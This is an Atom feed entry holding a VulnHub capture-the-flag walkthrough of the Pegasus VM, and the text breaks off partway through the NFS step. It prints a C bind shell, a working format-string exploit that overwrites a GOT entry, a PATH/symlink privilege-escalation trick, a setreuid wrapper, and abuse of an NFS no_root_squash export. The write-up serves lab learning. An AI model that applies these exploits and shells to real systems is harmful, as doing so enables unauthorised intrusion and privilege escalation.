<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[FourFourFourFour]]></title>
  <link href="http://recrudesce.github.io/atom.xml" rel="self"/>
  <link href="http://recrudesce.github.io/"/>
  <updated>2015-01-02T01:36:12+00:00</updated>
  <id>http://recrudesce.github.io/</id>
  <author>
    <name><![CDATA[recrudesce]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Because she was a princess she had a Pegasus.]]></title>
    <link href="http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/"/>
    <updated>2014-12-19T13:50:49+00:00</updated>
    <id>http://recrudesce.github.io/2014/12/19/because-she-was-a-princess-she-had-a-pegasus</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/theknapsy">Knapsy</a> (<a href="https://knapsy.github.io/">blog</a>) released <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> - to be honest I was supposed to beta test it, but I kinda didn&rsquo;t get a chance to. However, it allowed me to experience the VM at the same time as everyone else.</p>

<p>People generally work alone on VM&rsquo;s, so to mix it up a bit, I decided to team up with <a href="https://twitter.com/barrebas">barrebas</a> (<a href="https://barrebas.github.io/">blog</a>) and own the VM as a collaboration :)</p>

<p>So, here&rsquo;s a quick walkthrough on how to root Pegasus, written by both barrebas and myself.</p>

<!-- more -->


<h1>Getting a Foot(hoof?)hold</h1>

<p><img src="http://awesomelytechie.com/wp-content/uploads/2013/08/Lets-get-down-to-business.gif" alt="" /></p>

<p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:31 GMT
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
</span><span class='line'>Host is up <span class="o">(</span>0.000063s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65526</span> closed ports
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>22/tcp    open  ssh
</span><span class='line'>111/tcp   open  rpcbind
</span><span class='line'>8088/tcp  open  radan-http
</span><span class='line'>
</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.74 seconds
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_001.png" alt="pegasus_001" /></a></p>

<p>Time to brute force some directories/files. Experience has shown me that vulnerable VM creators are sneaky gits, so I opted to use a large dictionary here, just to see what it came up with. Because of this large dictionary, I had to use dirbuster instead of dirb, because dirb takes ages to parse large dictionary files. Prepare for some horrible UI screenshots&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_002.png" alt="pegasus_002" /></a></p>

<p>I&rsquo;m only interested in the files that returned HTTP 200, as these actually exist, so submit.php and codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_003.png" alt="pegasus_003" /></a></p>

<p>codereview.php POSTS to submit.php, so for the moment I can ignore submit.php and focus on codereview.php</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/12/pegasus_004.png" alt="pegasus_004" /></a></p>

<p><img src="http://i527.photobucket.com/albums/cc352/gabzylovescrack/HTTYD/Shudder.gif" alt="" /></p>

<p>Mike is a code reviewer, and a trainee&hellip; therefore is pretty inexperienced. After a bit of time throwing various languages at the application, I found out that if you provide C sourcecode, it gets compiled and executed. Nice ! Lets bash some shellcode in there - specifically a bind shell and submit it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">dstport</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">o</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">mysockaddr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">//setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;o, sizeof(o)); //a luxury we don&#39;t have space for</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span> <span class="c1">//2</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">dstport</span><span class="p">);</span>
</span><span class='line'>        <span class="n">mysockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> <span class="c1">//0</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">mysockaddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mysockaddr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick NMAP scan confirms port 4444 has been opened.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:47 GMT
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.04 seconds
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nv 172.16.231.132 4444
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.231.132<span class="o">]</span> <span class="m">4444</span> <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>mike@pegasus:/home/mike<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span>
</span><span class='line'>mike@pegasus:/home/mike<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now over to barrebas for the next step ! <em>fancy screen wipe animation</em></p>

<hr />

<p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span></code></pre></td></tr></table></div></figure>


<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: AAAA
</span><span class='line'>Error details: AAAA
</span></code></pre></td></tr></table></div></figure>


<p>That seemed promising. I entered:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: %x
</span><span class='line'>Error details: bff1039c
</span></code></pre></td></tr></table></div></figure>


<p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>ldd my_first
</span><span class='line'>  linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x40022000<span class="o">)</span>
</span><span class='line'>  libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0x4002a000<span class="o">)</span>
</span><span class='line'>  /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>080483b0 &lt;<span class="nb">printf</span>@plt&gt;:
</span><span class='line'> 80483b0: ff <span class="m">25</span> <span class="nb">fc </span>9b <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049bfc
</span><span class='line'> 80483b6: <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
</span><span class='line'> 80483bb: e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 5
</span><span class='line'>Enter second number: AAAA%8<span class="nv">$x</span>
</span><span class='line'>Error details: AAAA41414141
</span></code></pre></td></tr></table></div></figure>


<p>So I got working on an exploit. I quickly came up with this python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start calculator thingie</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite first part of got pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfe</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%16386c</span><span class="s">%8$hn&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite second part of got pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfc</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%20566c</span><span class="s">%12$hn&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># exit program</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>python exploit.py <span class="p">|</span> ./my_first
</span><span class='line'>
</span><span class='line'>...snip...
</span><span class='line'>
</span><span class='line'>sh: 1: Selection:: not found
</span><span class='line'>
</span><span class='line'>Goodbye!
</span></code></pre></td></tr></table></div></figure>


<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ln -s /bin/dash Selection:
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;.:$PATH&quot;</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="o">(</span>python ./exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./my_first
</span><span class='line'>
</span><span class='line'>...snip...
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 165, in spawn
</span><span class='line'>    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 107, in fork
</span><span class='line'>    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 29, in openpty
</span><span class='line'>    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 70, in _open_terminal
</span><span class='line'>    raise os.error, <span class="s1">&#39;out of pty devices&#39;</span>
</span><span class='line'>OSError: out of pty devices
</span></code></pre></td></tr></table></div></figure>


<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'><span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'><span class="n">setregid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp/a.out
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> john on this host:
</span><span class='line'>    env_reset,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User john may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/nfs
</span></code></pre></td></tr></table></div></figure>


<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/opt/nfs *<span class="o">(</span>rw,sync,crossmnt,no_subtree_check,no_root_squash
</span></code></pre></td></tr></table></div></figure>


<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
</span><span class='line'>root@kali:~# <span class="nb">cd</span> /mnt/nfs
